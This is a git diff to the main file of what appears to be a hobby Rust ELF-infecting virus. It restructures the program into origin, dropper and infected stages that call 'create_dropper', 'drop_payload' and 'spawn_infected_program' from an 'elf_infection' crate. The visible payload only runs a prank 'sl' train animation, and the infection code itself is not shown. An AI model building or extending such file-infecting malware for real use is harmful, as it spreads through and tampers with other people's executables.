@@ -1,15 +1,20 @@
 use sl::sl;
 use elf_infection::infect::{
-    infect_victim,
-    is_already_infected,
+    get_own_infection_status,
+    create_dropper, 
+    drop_payload, 
     spawn_infected_program,
+    InfectionStatus,
 };
 
-fn main() {
-    match is_already_infected() {
-        false => infect_victim(),
-        true => payload(),
+fn main() -> Result<(), Box<dyn std::error::Error>> {
+    match get_own_infection_status() {
+        InfectionStatus::Origin => create_dropper()?,
+        InfectionStatus::Dropper => drop_payload()?,
+        InfectionStatus::Infected => payload(),
     }
+
+    Ok(())
 }
 
 fn fun_stuff() {
@@ -21,6 +26,3 @@ fn payload() {
     fun_stuff();
     let _ = spawn_infected_program();
 }
-
-
-
